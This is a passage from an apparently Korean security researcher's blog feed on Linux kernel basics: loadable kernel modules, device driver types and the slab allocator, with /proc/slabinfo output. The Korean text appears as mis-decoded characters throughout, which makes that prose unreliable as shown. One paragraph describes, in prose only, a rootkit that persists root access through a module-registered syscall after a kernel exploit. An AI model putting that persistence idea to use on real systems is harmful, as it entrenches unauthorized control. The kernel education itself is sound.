ë¶ˆí¸í•¨ì´ ìƒê¸¸ì§€ ê³ ë¯¼í•´ë³´ê² ë‹¤. í•˜ë“œì›¨ì–´ëŠ” ì»¤ë„ì— ê·¼ì ‘ë˜ì–´ ìˆìœ¼ë©° ì»¤ë„ì€ ìœ ì €ëª¨ë“œì—ì„œ ë¶„ë¦¬ë˜ì–´ ìˆë‹¤. ê·¸ë ‡ê¸°ì— í•˜ë“œì›¨ì–´ë¥¼ ì œì–´í•˜ê¸° ìœ„í•´ì„œëŠ” ìœ ì € ëª¨ë“œì—ì„œ ì»¤ë„ì— ìš”ì²­ì„ ë³´ë‚´ì„œ ì œì–´í•˜ëŠ” ê°„ì ‘ì ì¸ í˜•íƒœë¡œ ë³¼ ìˆ˜ ìˆë‹¤. ê²°ê³¼ì ìœ¼ë¡œ í•´ë‹¹ ë””ë°”ì´ìŠ¤ë¥¼ ì œì–´í•˜ê¸° ìœ„í•´ì„œëŠ” ì»¤ë„ì— íƒ‘ì¬ê°€ ë˜ì–´ ìˆì–´ì•¼ í•œë‹¤.</p><p>í˜„ì¬ëŠ” ì „ ì„¸ê³„ê°€ ë©”íƒ€ë²„ìŠ¤ ì½”ì¸ì— íƒ‘ìŠ¹í•˜ì—¬ ë‹¤ì–‘í•œ í˜•íƒœì˜ ìƒˆë¡œìš´ í•˜ë“œì›¨ì–´ ì£¼ë³€ ì¥ì¹˜ë“¤ì´ ì¶œì‹œë˜ê³  ìˆë‹¤. ê·¸ëŸ´ ê²½ìš°ë§ˆë‹¤ ë¦¬ëˆ…ìŠ¤ ì»¤ë„ì— í•´ë‹¹ ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ë¥¼ í¬í•¨í•˜ì—¬ ë¹Œë“œí•œë‹¤ë©´ ì ˆëŒ€ë¡œ ëë‚˜ì§€ ì•ŠëŠ” ë¬´ê°„ì§€ì˜¥ì— ë¹ ì§€ëŠ” ê¼´ì´ ëœë‹¤. ë˜í•œ ì»¤ë„ì„ í•„ìš”í•  ë•ŒëŠ” ì‚¬ìš©í•˜ê³  í•„ìš”í•˜ì§€ ì•Šì„ ë•ŒëŠ” ì‚¬ìš©í•˜ì§€ ì•Šë„ë¡ ë©”ëª¨ë¦¬ì— ë¡œë“œí•˜ê±°ë‚˜ ë¡œë“œí•˜ì§€ ì•Šë„ë¡ í•œë‹¤ë©´ ì´ì— ë”°ë¥¸ ì´ì ë„ ìƒê¸´ë‹¤. ì´ëŸ¬í•œ ë¶ˆí¸í•¨ì„ ë¦¬ëˆ…ìŠ¤ì—ì„œ ì œê³µí•˜ëŠ” ê¸°ëŠ¥ì¸ ì ì¬ ê°€ëŠ¥ ì»¤ë„ ëª¨ë“ˆ(Loadable Kernel Module)ì´ë‹¤.</p><p>ì ì¬ ê°€ëŠ¥ ì»¤ë„ ëª¨ë“ˆ(Loadable Kernel Module)ì´ë€ ë³´ë‹¤ ììœ ë¡­ê²Œ ì»¤ë„ì— ë“±ë¡í•˜ê±°ë‚˜ í•´ì œí•˜ê±°ë‚˜ë¥¼ í†µí•´ì„œ ì†ì‰½ê²Œ ë‹¤ë£° ìˆ˜ ìˆë‹¤. ì¼ë°˜ì ìœ¼ë¡œ LKM(Loadable Kernel Module)ì´ ì‚¬ìš©ë˜ëŠ” ê²½ìš°ëŠ” ë‹¤ìŒê³¼ ê°™ë‹¤. </p><pre><code>ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„(Device Driver)íŒŒì¼ ì‹œìŠ¤í…œ ë“œë¼ì´ë²„(Filesystem Driver)ì‹œìŠ¤í…œ ì½œ(System Call)ë„¤íŠ¸ì›Œí¬ ë“œë¼ì´ë²„(Network Driver)í„°ë¯¸ë„ ë“œë¼ì´ë²„(TTY line disciplines)ì‹¤í–‰ê°€ëŠ¥í•œ ì¸í„°í”„ë¦¬í„°(Executable Interpreters)</code></pre><p>ë‹¤ìŒì— ì œì‹œëœ ì¼ë°˜ì ì¸ ìš©ë„ë¥¼ ì‚´í´ë³´ë©´ ìƒˆë¡œìš´ ì¥ì¹˜ì˜ ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ë§Œì„ ì´ì•¼ê¸°í•˜ëŠ” ê²ƒì´ ì•„ë‹Œ ì‚¬ìš©ìê°€ ì •ì˜í•œ í˜•íƒœì˜ ì‹œìŠ¤í…œ ì½œë„ ëª¨ë“ˆë¡œ íƒ‘ì¬ê°€ ê°€ëŠ¥í•˜ë‹¤ëŠ” ê²ƒì´ë‹¤. ì´ëŸ¬í•œ ìƒê°ë„ ê°€ëŠ¥í•œ ë° ë§Œì•½ ê¶Œí•œìƒìŠ¹ ê³µê²©ì´ KASLRì´ë‚˜ ì—¬ëŸ¬ê°€ì§€ ìš”ì†Œë¡œ Exploit ìì²´ê°€ í™•ë¥ ì ìœ¼ë¡œ ìˆ˜í–‰ëœë‹¤ë©´ ë£¨íŠ¸ ê¶Œí•œì„ ì–»ì€ ì‹œì ì—ì„œ íŠ¹ì • ì‹œìŠ¤í…œ ì½œì„ ì‚¬ìš©í•˜ë©´ ë£¨íŠ¸ ê¶Œí•œì„ íšë“í•˜ëŠ” í˜•íƒœë¡œ ëª¨ë“ˆì„ ë“±ë¡í•´ë†“ëŠ”ë‹¤ë©´ ë§¤ë²ˆ Exploitì„ ì§„í–‰í•  í•„ìš”ê°€ ì—†ì´ ì„±ê³µì ìœ¼ë¡œ ê¶Œí•œ ìƒìŠ¹ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆë‹¤. ì´ëŸ¬í•œ ê²ƒì´ ì¼ë°˜ì ìœ¼ë¡œ ì–¸ê¸‰ë˜ëŠ” ë£¨íŠ¸í‚·(rootkit)ì´ë‹¤.</p><p>ê·¸ë ‡ë‹¤ë©´ ë§ˆì´í¬ë¡œ ì»¤ë„(Micro Kernel)ê³¼ ë‹¤ë¥¸ ì ì´ ë¬´ì—‡ì´ëƒê³  í•  ìˆ˜ ìˆë‹¤. í•´ë‹¹ ì–¸ê¸‰ì€ ì–´ë””ì—ì„œë„ ì°¾ì•„ë³¼ ìˆ˜ ì—†ëŠ” ë° <u>ë‚´ê°€ ìƒê°í•˜ê³  ëŠë‚€ ë°”ë¡œ ê°€ì¥ í° ì°¨ì´ì ì€ ì–´ë– í•œ ì˜ì—­ì— ì»¤ë„ì´ íƒ‘ì¬ë˜ëƒëŠ” ê²ƒ</u>ì´ë‹¤. ë§ˆì´í¬ë¡œ ì»¤ë„(Micro Kernel)ì˜ ê²½ìš° ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ì™€ ê°™ì€ ê¸°ëŠ¥ë“¤ì€ ìœ ì € ì˜ì—­ì˜ ë©”ëª¨ë¦¬ì— ìƒì£¼í•œë‹¤ê³  í•˜ë©´ ì ì¬ ê°€ëŠ¥ ì»¤ë„ ëª¨ë“ˆ(LKM)ì€ ì»¤ë„ ì˜ì—­ì— ë¡œë“œê°€ ë˜ë¯€ë¡œ ì´ëŠ” ëª¨ë†€ë¦¬ì‹ ì»¤ë„(Monolithic Kernel)ì˜ í™•ì¥ìœ¼ë¡œ ì´í•´í•˜ëŠ” ê²ƒì´ ë§ìŒìœ¼ë¡œ íŒë‹¨ëœë‹¤. ê·¸ë ‡ì§€ ì•Šë‹¤ë©´ Kernel Exploitationì„ ìœ„í•œ ê³µê²© ë²¡í„°ë¡œ ë³¼ ìˆ˜ ì—†ê¸°ì— í•´ë‹¹ í¬ìŠ¤íŠ¸ëŠ” ë¬´ì˜ë¯¸í•œ í¬ìŠ¤íŠ¸ê°€ ëœë‹¤.</p></br><h2 id="ë””ë°”ì´ìŠ¤-ë“œë¼ì´ë²„"><a href="#ë””ë°”ì´ìŠ¤-ë“œë¼ì´ë²„" class="headerlink" title="ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„"></a>ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„</h2><p><img src="/img/device_driver_sample.PNG" alt="ì»¤ë„ì˜ ì¢…ë¥˜"></p><p>ì´ì „ ë‹¨ë½ì—ì„œ LKM(Loadable Kernel Module)ì— ëŒ€í•´ì„œ ì–¸ê¸‰í•˜ì˜€ìœ¼ë©° í•´ë‹¹ ë‹¨ë½ì—ì„œëŠ” ì¼ë°˜ì ìœ¼ë¡œ LKMìœ¼ë¡œ êµ¬í˜„ë˜ëŠ” ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ì— ëŒ€í•œ ì–¸ê¸‰ì„ ì§„í–‰í•˜ê² ë‹¤. ë‹¤ì‹œ í•œë²ˆ ê°•ì¡°í•˜ì§€ë§Œ <u>ìœ ì € ì–´í”Œë¦¬ì¼€ì´ì…˜ì€ ì§ì ‘ì ìœ¼ë¡œ í•˜ë“œì›¨ì–´ë¥¼ ì œì–´í•  ìˆ˜ ì—†ë‹¤.</u> ì»¤ë„ì— ìš”ì²­ì„ í•˜ì—¬ í•˜ë“œì›¨ì–´ë¥¼ ì œì–´í•´ì•¼ í•˜ë©° ì´ëŸ¬í•œ ë§¤ê°œì²´ì˜ ì—­í• ì„ í•˜ëŠ” ê²ƒì´ ì»¤ë„ ì¤‘ ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ì´ë‹¤.</p><p>ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ëŠ” ì»´í“¨í„°ì™€ ì—°ê²°ëœ ì¥ì¹˜ë¥¼ ì¶”ìƒí™”ì‹œí‚¤ë¯€ë¡œ ìœ ì € ì–´í”Œë¦¬ì¼€ì´ì…˜ì´ ì •í˜•í™”ëœ ì¸í„°í˜ì´ìŠ¤ë¥¼ í†µí•´ ì¥ì¹˜ì— ì ‘ê·¼í•  ìˆ˜ ìˆëŠ” í˜•íƒœì˜ ì†Œí”„íŠ¸ì›¨ì–´ë¡œ ë³¼ ìˆ˜ ìˆë‹¤. ì»¤ë„ì´ ì»´íŒŒì¼ë  ë•Œ ë¶€í„° í¬í•¨ëœ ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ë„ ìˆìœ¼ë©° ì»¤ë„ ë¶€íŒ… í›„ì— ë¡œë“œí•˜ëŠ” ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ë„ ì¡´ì¬í•œë‹¤. ê²°ê³¼ì ìœ¼ë¡œ LKMìœ¼ë¡œ ë³¼ ìˆ˜ ìˆë‹¤.</p><br><p><img src="/img/device_driver_list.png"></p><br><h3 id="ìºë¦­í„°-ë””ë°”ì´ìŠ¤-ë“œë¼ì´ë²„-chrdev"><a href="#ìºë¦­í„°-ë””ë°”ì´ìŠ¤-ë“œë¼ì´ë²„-chrdev" class="headerlink" title="ìºë¦­í„° ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„(chrdev)"></a>ìºë¦­í„° ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„(chrdev)</h3><p>ë””ë°”ì´ìŠ¤ë¥¼ íŒŒì¼ì²˜ëŸ¼ ì ‘ê·¼í•˜ë©° í•´ë‹¹ íŒŒì¼ì˜ read/writeë¥¼ ìˆ˜í–‰í•˜ì—¬ dataë¥¼ streamë°©ì‹ìœ¼ë¡œ ì „ì†¡í•œë‹¤. ì£¼ë¡œ console, keyboard, mouse, serial port driverë“±ì˜ í˜•íƒœë¡œ ì‚¬ìš©ëœë‹¤.</p><h3 id="ë¸”ë¡-ë””ë°”ì´ìŠ¤-ë“œë¼ì´ë²„-blkdev"><a href="#ë¸”ë¡-ë””ë°”ì´ìŠ¤-ë“œë¼ì´ë²„-blkdev" class="headerlink" title="ë¸”ë¡ ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„(blkdev)"></a>ë¸”ë¡ ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„(blkdev)</h3><p>diskì™€ ê°™ì€ file systemì„ ê¸°ë°˜ìœ¼ë¡œ block ë‹¨ìœ„ë¡œ ë°ì´í„°ë¥¼ read/writeí•œë‹¤. ì£¼ë¡œ hard disk, CD ROM driverë“±ì— ì‚¬ìš©ëœë‹¤. ì‹œìŠ¤í…œ ë²„í¼ ìºì‹œë¥¼ ì‚¬ìš©í•œë‹¤ëŠ” íŠ¹ì„±ì„ ê°€ì§€ê³  ìˆë‹¤.</p><h3 id="ë„¤íŠ¸ì›Œí¬-ë””ë°”ì´ìŠ¤-ë“œë¼ì´ë²„-netdev"><a href="#ë„¤íŠ¸ì›Œí¬-ë””ë°”ì´ìŠ¤-ë“œë¼ì´ë²„-netdev" class="headerlink" title="ë„¤íŠ¸ì›Œí¬ ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„(netdev)"></a>ë„¤íŠ¸ì›Œí¬ ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„(netdev)</h3><p>networkì˜ ë¬¼ë¦¬ê³„ì¸µê³¼ frame ë‹¨ìœ„ì˜ ë°ì´í„°ë¥¼ ì†¡ìˆ˜ì‹ í•˜ëŠ” ë“œë¼ì´ë²„ì´ë‹¤. ì£¼ë¡œ ì´ë”ë„· ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„(eth0)ë“±ì— ì‚¬ìš©ëœë‹¤.</p><br><p>ìœ ì € ì–´í”Œë¦¬ì¼€ì´ì…˜ ì…ì¥ì—ì„œëŠ” ê°€ìƒ íŒŒì¼ ì‹œìŠ¤í…œ(VFS)ë¥¼ ì‚¬ìš©í•˜ê¸° ë•Œë¬¸ì— íŒŒì¼ ë””ìŠ¤í¬ë¦½í„°ë¥¼ í†µí•´ íŠ¹ì • íŒŒì¼ ì ‘ê·¼í•˜ì—¬ ê°’ì„ ì½ê±°ë‚˜(read) ì“°ëŠ” í˜•íƒœ(write)ë¡œ ì‰½ê²Œ í•˜ë“œì›¨ì–´ê°€ ì œì–´ê°€ëŠ¥í•˜ë‹¤. ì´ëŸ° ì˜ë¯¸ë¡œ íŒŒì¼ë¡œ ì¶”ìƒí™” ì‹œì¼°ë‹¤ê³  ë³¼ ìˆ˜ ìˆìœ¼ë©° ì •í˜•í™” ëœ ì¸í„°í˜ì´ìŠ¤ë¡œ ë¶ˆ ìˆ˜ ìˆë‹¤ëŠ” ê²ƒ ì´ë‹¤. í•˜ì§€ë§Œ ì„¸ë¶€ì ìœ¼ë¡œ ë³´ì•˜ì„ ë•Œ ë²„í¼ë¥¼ ì‚¬ìš©í•œë‹¤ ì‚¬ìš©í•˜ì§€ ì•ŠëŠ”ë‹¤ ë“±ì˜ íŠ¹ì§•ì´ ìˆë‹¤.</p><br><h2 id="ì •ë¦¬"><a href="#ì •ë¦¬" class="headerlink" title="ì •ë¦¬"></a>ì •ë¦¬</h2><p>ì»¤ë„ì˜ ì¢…ë¥˜ë¥¼ ì•Œì•„ë³´ì•˜ìœ¼ë©° í•´ë‹¹ ì»¤ë„ë§ˆë‹¤ ì–´ë– í•œ íŠ¹ì„±ì„ ì§€ë‹ˆê³  ë°œìƒí•˜ëŠ” ë‹¨ì ì„ í•´ê²°í•˜ê¸° ìœ„í•´ LKMì„ í•™ìŠµí•˜ì˜€ë‹¤. LKMìœ¼ë¡œ ì‚¬ìš©ë˜ëŠ” ì˜ˆì‹œ ì¤‘ í•˜ë‚˜ì¸ ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ì— ëŒ€í•´ì„œ ì¡°ì‚¬í•´ë³´ì•˜ë‹¤. ê¸€ì´ ë„ˆë¬´ ê¸¸ì–´ì ¸ì„œ ì§ì ‘ ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ë¥¼ ê°œë°œí•˜ëŠ” ê²ƒì€ ë‹¤ìŒ í¬ìŠ¤íŠ¸ì—ì„œ ì§„í–‰í•˜ë„ë¡ í•˜ê² ë‹¤.</p><br><h2 id="í•œì¤„í‰"><a href="#í•œì¤„í‰" class="headerlink" title="í•œì¤„í‰"></a>í•œì¤„í‰</h2><pre><code>As Soon As (ex)Ploit...</code></pre><br><h2 id="ì°¸ê³ "><a href="#ì°¸ê³ " class="headerlink" title="ì°¸ê³ "></a>ì°¸ê³ </h2><pre><code>b30w0lfë‹˜ì˜ ìš´ì˜ì²´ì œ(Operating System)https://butter-shower.tistory.com/29https://temp123.tistory.com/16https://tribal1012.tistory.com/154http://artoa.hanbat.ac.kr/lecture_data/embedded_sw/04_old.pdf</code></pre>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>exploit</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>mitigation</tag>
      
      <tag>kaslr</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Linux Kernel Basic - (5) ì»¤ë„ì—ì„œì˜ ë©”ëª¨ë¦¬ í• ë‹¹ 3í¸</title>
    <link href="/2021/09/07/LinuxKernelBasic5/"/>
    <url>/2021/09/07/LinuxKernelBasic5/</url>
    
    <content type="html"><![CDATA[<h2 id="Research-Linux-Kernel-Basic-5-ì»¤ë„ì—ì„œì˜-ë©”ëª¨ë¦¬-í• ë‹¹-3í¸"><a href="#Research-Linux-Kernel-Basic-5-ì»¤ë„ì—ì„œì˜-ë©”ëª¨ë¦¬-í• ë‹¹-3í¸" class="headerlink" title="[Research] Linux Kernel Basic - (5) ì»¤ë„ì—ì„œì˜ ë©”ëª¨ë¦¬ í• ë‹¹ 3í¸"></a>[Research] Linux Kernel Basic - (5) ì»¤ë„ì—ì„œì˜ ë©”ëª¨ë¦¬ í• ë‹¹ 3í¸</h2><p><img src="/img/penguinshot.png"></p><h2 id="ì„œë¡ "><a href="#ì„œë¡ " class="headerlink" title="ì„œë¡ "></a>ì„œë¡ </h2><p>í•´ë‹¹ í¬ìŠ¤íŠ¸ì—ì„œëŠ” ë¦¬ëˆ…ìŠ¤ ì»¤ë„(Linux Kernel)ì—ì„œë„ ì—°ì‚°ì„ ìˆ˜í–‰í•˜ê¸° ìœ„í•´ì„œ ë°ì´í„°ê°€ ì €ì¥ë˜ì–´ì•¼ë§Œ í•˜ëŠ” ê³µê°„ì´ ìˆì–´ì•¼ í•œë‹¤. ì´ëŸ¬í•œ ê³µê°„ì˜ ì£¼ì²´ëŠ” ë©”ëª¨ë¦¬(memory)ì´ë©° ë¦¬ëˆ…ìŠ¤ ì»¤ë„(Linux Kernel)ì—ì„œì˜ ë©”ëª¨ë¦¬ì˜ í• ë‹¹ ë°©ì‹ì„ ì•Œì•„ë³¸ë‹¤. ì´ì „ í¬ìŠ¤íŠ¸ì—ì„œëŠ” í˜ì´ì§€ ë‹¨ìœ„ë¡œ ë©”ëª¨ë¦¬ë¥¼ í• ë‹¹í•˜ëŠ” alloc_pageì— ëŒ€í•´ ì–¸ê¸‰í•˜ì˜€ê³  í•´ë‹¹ í¬ìŠ¤íŠ¸ì—ì„œëŠ” ì‘ì€ ë©”ëª¨ë¦¬ ê³µê°„ ë™ì  í• ë‹¹ì— ëŒ€í•œ í¬ìŠ¤íŒ…ì„ ì§„í–‰í•œë‹¤.</p><h2 id="í˜ì´ì§€-ë‹¨ìœ„-í• ë‹¹ì˜-ë¬¸ì œ"><a href="#í˜ì´ì§€-ë‹¨ìœ„-í• ë‹¹ì˜-ë¬¸ì œ" class="headerlink" title="í˜ì´ì§€ ë‹¨ìœ„ í• ë‹¹ì˜ ë¬¸ì œ"></a>í˜ì´ì§€ ë‹¨ìœ„ í• ë‹¹ì˜ ë¬¸ì œ</h2><p><img src="/img/internal_frag.PNG" alt="Internal Fragmentation"></p><p>ì¼ë°˜ì ì¸ ë¦¬ëˆ…ìŠ¤ ì‹œìŠ¤í…œì˜ ê²½ìš°ëŠ” ë¬¼ë¦¬ ë©”ëª¨ë¦¬ë¥¼ í˜ì´ì§€ ë‹¨ìœ„ë¡œ ê´€ë¦¬í•œë‹¤. ë©”ëª¨ë¦¬ í• ë‹¹ê³¼ ë©”ëª¨ë¦¬ í•´ì œì— ìˆì–´ì„œ í˜ì´ì§€ì˜ í¬ê¸°ì¸ 4KB(0x1000)ì„ ê¸°ì¤€ìœ¼ë¡œ ì´ë£¨ì–´ì§„ë‹¤ëŠ” ê²ƒì´ë‹¤. ì¼ë°˜ì ìœ¼ë¡œ ì‚¬ì´ì¦ˆê°€ í˜ì´ì§€ ë‹¨ìœ„ì— ê·¼ì ‘í•˜ëŠ” í”„ë¡œê·¸ë¨ì´ ë©”ëª¨ë¦¬ì— ë¡œë“œë˜ì–´ í”„ë¡œì„¸ìŠ¤ê°€ ë˜ëŠ” ê²½ìš°ëŠ” ë¬¸ì œê°€ ëŠê»´ì§€ì§€ ì•Šì„ ìˆ˜ ìˆë‹¤. í•˜ì§€ë§Œ ì»¤ë„ì˜ ê²½ìš°ì—ì„œë„ ì‘ì€ ì‚¬ì´ì¦ˆì˜ ë©”ëª¨ë¦¬ì˜ ë™ì í• ë‹¹ì´ í•„ìš”í•œ ê²½ìš°ê°€ ìˆì„ ê²ƒì´ë‹¤. ë§Œì•½ 32ë°”ì´íŠ¸ì˜ ë©”ëª¨ë¦¬ê°€ í•„ìš”í•œ ê²½ìš°ì— ë‹¤ìŒê³¼ ê°™ì´ í˜ì´ì§€ ë‹¨ìœ„ë¡œ ê´€ë¦¬í•˜ê²Œ ëœë‹¤ë©´ ì—„ì²­ë‚œ ì–‘ì˜ Internal Fragmentationì´ ë°œìƒí•œë‹¤. ë” ë‚˜ì•„ê°€ ë¹ˆë²ˆí•œ í• ë‹¹ê³¼ í•´ì œëŠ” ì†ë„ì— ìˆì–´ì„œë„ ë§¤ìš° ë¹„íš¨ìœ¨ì ì´ë‹¤. ì´ëŸ¬í•œ íŠ¹ì„±ë“¤ì€ ë©”ëª¨ë¦¬ì˜ ê´€ë¦¬ë¥¼ í˜ì´ì§€ ë‹¨ìœ„ë¡œ í•˜ê¸°ì— ë°œìƒí•˜ëŠ” íŠ¹ì„±ì´ë©° ë‹¤ìŒ ì–¸ê¸‰í•  ë‚´ìš©ì€ ì´ëŸ¬í•œ ë¬¸ì œë¥¼ í•´ê²°í•˜ëŠ” ë°©ë²•ì´ë‹¤.</p><h2 id="ìŠ¬ë©-í• ë‹¹ì-Slab-Allocator"><a href="#ìŠ¬ë©-í• ë‹¹ì-Slab-Allocator" class="headerlink" title="ìŠ¬ë© í• ë‹¹ì(Slab Allocator)"></a>ìŠ¬ë© í• ë‹¹ì(Slab Allocator)</h2><p>ìŠ¬ë© í• ë‹¹ìì˜ ê°œë…ì„ ì´í•´í•˜ê¸° ìœ„í•´ì„œëŠ” ì»¤ë„ ê°œë°œìê°€ ë˜ì—ˆë‹¤ê³  ê°€ì •í•´ë³´ê² ë‹¤. ìš´ì˜ì²´ì œë¥¼ ì‚¬ìš©í•˜ë©° í”„ë¡œì„¸ìŠ¤ë¥¼ ì‹œì‘í•˜ê±°ë‚˜ í•˜ëŠ” ë“±ì˜ ì¼ë“¤ì„ ì§„í–‰í•  ìˆ˜ ìˆë‹¤. ê·¸ ê³¼ì •ì—ì„œ ë‹¤ìŒê³¼ ê°™ì€ íŠ¹ì„±ì„ ë°œê²¬í•˜ì˜€ë‹¤.</p><pre><code>íŠ¹ì •í•œ í¬ê¸°ë¥¼ ê°€ì§„ ë©”ëª¨ë¦¬ê°€ í• ë‹¹ê³¼ í•´ì œë¥¼ ë°˜ë³µí•œë‹¤.</code></pre><p>ì´ëŸ¬í•œ íŠ¹ì„±ì„ ì´ìš©í•˜ë©´ ë³´ë‹¤ íš¨ìœ¨ì ì¸ ë©”ëª¨ë¦¬ í• ë‹¹ ì‹œìŠ¤í…œì„ êµ¬í˜„í•  ìˆ˜ ìˆë‹¤.</p><pre><code>ìì£¼ ì“°ëŠ” ë©”ëª¨ë¦¬ íŒ¨í„´ì„ ì •ì˜í•œ í›„ ë¯¸ë¦¬ í• ë‹¹í•´ ë†“ëŠ”ë‹¤.í•´ë‹¹ íŒ¨í„´ì— ëŒ€í•œ ë©”ëª¨ë¦¬ í• ë‹¹ ìš”ì²­ì´ ë°œìƒí•  ê²½ìš° í• ë‹¹í•´ ë†“ì€ ë©”ëª¨ë¦¬ë¥¼ ì‚¬ìš©í•˜ê²Œ í•œë‹¤.í•´ë‹¹ íŒ¨í„´ì— ëŒ€í•œ ë©”ëª¨ë¦¬ í•´ì œ ìš”ì²­ì´ ë°œìƒí•˜ë©´ í•´ì œí•˜ì§€ ì•Šê³  ëŒ€ê¸°í•œë‹¤. ë‹¤ì‹œ í•´ë‹¹ íŒ¨í„´ìœ¼ë¡œ ë©”ëª¨ë¦¬ í• ë‹¹ ìš”ì²­ì„ í•  ê°€ëŠ¥ì„±ì´ ë†’ë‹¤.</code></pre><p>í•´ë‹¹ êµ¬ì¡°ë¥¼ ë©”ëª¨ë¦¬ í’€(memory pool) êµ¬ì¡°ë¼ê³  í•œë‹¤. b30w0lfë‹˜ì˜ ìš´ì˜ì²´ì œ ì‹œê°„ì— ì ê¹ ì—¬ëŸ¬ê°€ì§€ ê³µì„ ìˆ˜ì˜ì¥ì— ë„£ì–´ë‘ì—ˆë‹¤ê°€ ì¤€ë‹¤ëŠ” í´ë¦½ ì•„íŠ¸ë¥¼ ë³´ì•˜ì—ˆëŠ”ë° ê·¸ê²ƒì´ ë°”ë¡œ ì´ê²ƒì´ë‹¤!</p><p>ì´ëŸ¬í•œ í˜•íƒœì˜ ë©”ëª¨ë¦¬ ê´€ë¦¬ êµ¬ì¡°ë¥¼ <u>ìŠ¬ë© ë©”ëª¨ë¦¬ í• ë‹¹</u>ì´ë¼ê³  í•œë‹¤.</p><h2 id="ìŠ¬ë©-ìºì‹œ-ìŠ¬ë©-ì˜¤ë¸Œì íŠ¸-ìŠ¬ë©-í˜ì´ì§€"><a href="#ìŠ¬ë©-ìºì‹œ-ìŠ¬ë©-ì˜¤ë¸Œì íŠ¸-ìŠ¬ë©-í˜ì´ì§€" class="headerlink" title="ìŠ¬ë© ìºì‹œ, ìŠ¬ë© ì˜¤ë¸Œì íŠ¸, ìŠ¬ë© í˜ì´ì§€"></a>ìŠ¬ë© ìºì‹œ, ìŠ¬ë© ì˜¤ë¸Œì íŠ¸, ìŠ¬ë© í˜ì´ì§€</h2><h3 id="ìŠ¬ë©-ìºì‹œ-Slab-Cache"><a href="#ìŠ¬ë©-ìºì‹œ-Slab-Cache" class="headerlink" title="ìŠ¬ë© ìºì‹œ(Slab Cache)"></a>ìŠ¬ë© ìºì‹œ(Slab Cache)</h3><p>ìŠ¬ë© ë©”ëª¨ë¦¬ í• ë‹¹ë°©ì‹ì„ ì´ì•¼ê¸°í•˜ë©° ì–¸ê¸‰í•˜ê³  ë„˜ì–´ê°€ì•¼ í•˜ëŠ” ê°œë…ì´ ìˆë‹¤. ìŠ¬ë© ìºì‹œ(Slab Cache), ìŠ¬ë© ì˜¤ë¸Œì íŠ¸(Slab Object), ìŠ¬ë© í˜ì´ì§€(Slab Page)ì— ê´€í•œ ë‚´ìš©ì´ë‹¤. </p><p>ìŠ¬ë© ìºì‹œ(Slab Cache)ë€ ì¼ì¢…ì˜ ìŠ¬ë© ë©”ëª¨ë¦¬ í• ë‹¹ì„ í•˜ë©° ê´€ë¦¬í•˜ëŠ” ì£¼ì²´ì¸ ë§¤ë‹ˆì €ì™€ ê°™ì€ í˜•íƒœë¼ê³  ë³¼ ìˆ˜ ìˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´ íŠ¹ì • ë°”ì´íŠ¸ ë§Œí¼ì˜ ë©”ëª¨ë¦¬ í• ë‹¹ ìš”ì²­ì´ ë“¤ì–´ì˜¬ ê²½ìš° ì´ë¥¼ ì œê³µí•´ì£¼ê³  í• ë‹¹ í•´ì œí•œ ìŠ¬ë© ë©”ëª¨ë¦¬ë¥¼ ë°›ì•„ì„œ ë‹¤ì‹œ ìš”ì²­ì´ ë“¤ì–´ì˜¬ ê²½ìš° ì´ë¥¼ ë‚´ì–´ì£¼ëŠ” ì£¼ì²´ê°€ ìŠ¬ë© ìºì‹œë¼ê³  ë³´ë©´ ëœë‹¤.</p><pre><code>ray@ubuntu:~/Kernel/device_driver$ sudo cat /proc/slabinfo slabinfo - version: 2.1# name            &lt;active_objs&gt; &lt;num_objs&gt; &lt;objsize&gt; &lt;objperslab&gt; &lt;pagesperslab&gt; : tunables &lt;limit&gt; &lt;batchcount&gt; &lt;sharedfactor&gt; : slabdata &lt;active_slabs&gt; &lt;num_slabs&gt; &lt;sharedavail&gt;mm_struct            180    180   1088   30    8 : tunables    0    0    0 : slabdata      6      6      0task_struct          940    955   6080    5    8 : tunables    0    0    0 : slabdata    191    191      0.kmalloc-512        21464  21632    512   64    8 : tunables    0    0    0 : slabdata    338    338      0kmalloc-256         4843   5248    256   64    4 : tunables    0    0    0 : slabdata     82     82      0kmalloc-192         2058   2058    192   42    2 : tunables    0    0    0 : slabdata     49     49      0kmalloc-128         1472   1472    128   64    2 : tunables    0    0    0 : slabdata     23     23      0kmalloc-96          6029   6300     96   42    1 : tunables    0    0    0 : slabdata    150    150      0kmalloc-64         12318  12800     64   64    1 : tunables    0    0    0 : slabdata    200    200      0kmalloc-32         11050  11136     32  128    1 : tunables    0    0    0 : slabdata     87     87      0kmalloc-16         10240  10240     16  256    1 : tunables    0    0    0 : slabdata     40     40      0kmalloc-8          13312  13312      8  512    1 : tunables    0    0    0 : slabdata     26     26      0</code></pre><p>ë‹¤ìŒì˜ ëª…ë ¹ì–´ë¥¼ í†µí•´ ìŠ¬ë© ìºì‹œë¥¼ í™•ì¸í•  ìˆ˜ ìˆë‹¤. í•´ë‹¹ ê²°ê³¼ë¥¼ ë³´ë©´ ìµìˆ™í•œ êµ¬ì¡°ì²´ì¸ task_struct, mm_structë“±ì´ ë³´ì´ë©° kmalloc-nê³¼ ê°™ì€ í˜•íƒœì˜ në°”ì´íŠ¸ì˜ ë©”ëª¨ë¦¬ì— 